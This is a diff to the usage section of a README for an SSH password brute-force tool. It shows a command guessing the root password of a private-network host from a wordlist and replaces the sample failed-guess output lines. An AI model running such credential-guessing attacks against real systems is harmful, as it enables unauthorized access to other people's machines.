@@ -42,12 +42,12 @@ optional arguments:
 python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
 ```
 ```text
-[-] 11 is not correct
-[-] 44 is not correct
-[-] 88 is not correct
-[-] 55 is not correct
-[-] 22 is not correct
-[-] 77 is not correct
+[-] 123221 is not correct
+[-] 442342 is not correct
+[-] 842482 is not correct
+[-] 524253 is not correct
+[-] 224224 is not correct
+[-] 724731 is not correct
 [+] 123456 is correct
 SSH PassWord：123456
 ```
